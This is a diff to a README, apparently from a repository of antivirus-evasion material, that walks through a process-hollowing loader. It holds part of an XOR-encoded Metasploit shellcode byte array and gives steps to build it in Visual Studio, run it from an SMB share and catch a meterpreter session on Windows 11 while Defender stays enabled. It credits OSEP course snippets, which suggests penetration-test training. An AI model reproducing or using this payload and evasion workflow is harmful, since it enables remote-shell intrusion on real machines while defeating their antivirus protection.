@@ -1,4 +1,5 @@
-## Tested in Visual Studio 2019
+## Built and Tested with Visual Studio 2019
+credit - [https://github.com/chvancooten/OSEP-Code-Snippets/tree/main](https://github.com/chvancooten/OSEP-Code-Snippets)
 
 Generate metasploit payload
 ```python
@@ -69,6 +70,31 @@ byte[] buf = new byte[511] {
 0x69, 0x5f, 0xd7, 0x1d, 0xa2, 0x1e, 0xde, 0x97, 0x40, 0xde, 0xa7, 0x56, 0xd7, 0x57, 0x5f,
 0x9b, 0x3a, 0xd7, 0x97, 0x57, 0xae, 0x76, 0xe3, 0x67, 0xda, 0x95, 0xda, 0xb2, 0x9e, 0xd3
 ```
+Open `P-Hollow` in Visual Studio
+
+Paste the XOR Encoded Shellcode in (You can turn on Defender now it wont be picked up) 
+
+![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/d8da75b5-2687-4ac8-a27a-25bd4f071332)
+
+If you changed the XOR Key in the previous file, ensure you change it here aswell otherwise it wont decode 
+
+![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/fd36f91e-f5fc-4d00-89c0-0ed04b66f9ac)
+
+Set to `Release` and `x64`
+
+Now depending on what access you already have, execute the .exe and catch in Metasploit.
+
+Here I am executing from a network share (impacket-smbserver) I configued
+
+![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/8602d6cc-a3d1-4ecf-8363-f0f281324f03)
+
+Fully functioning meterpreter session on latest Windows 11 with Defender Enabled
+
+![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/2dcbf6d6-951e-4b09-83fa-3d9092a87546)
+
+
+
+
 
 
 
